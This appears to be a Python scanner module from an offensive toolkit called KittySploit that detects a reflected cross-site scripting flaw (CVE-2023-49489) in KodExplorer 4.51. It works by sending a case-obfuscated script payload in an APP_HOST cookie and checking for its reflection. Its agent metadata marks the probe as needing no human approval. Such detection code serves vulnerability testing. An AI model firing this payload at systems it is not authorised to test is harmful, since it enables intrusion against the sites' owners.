#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Reflective Cross Site Scripting (XSS) vulnerability in KodExplorer version 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'KodeExplorer 4.51 - Reflective Cross Site Scripting (XSS) Detection',
        'description': 'Reflective Cross Site Scripting (XSS) vulnerability in KodExplorer version 4.51, allows attackers to obtain sensitive information and escalate privileges via the APP_HOST parameter at config/i18n/en/main.php.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'kodexplorer', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://github.com/kalcaddle/KodExplorer/issues/526'],
        'cve': 'CVE-2023-49489',
    }

    def run(self):
        path = '/index.php?user/login'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Cookie': 'APP_HOST={{RootURL}}/"><ScRiPt%20>alert(document.domain)</ScRiPt>'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<ScRiPt >alert(document.domain)</ScRiPt>', 'KodExplorer',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='KodeExplorer 4.51 - Reflective Cross Site Scripting (XSS) detected', path=path)
            return True
        return False

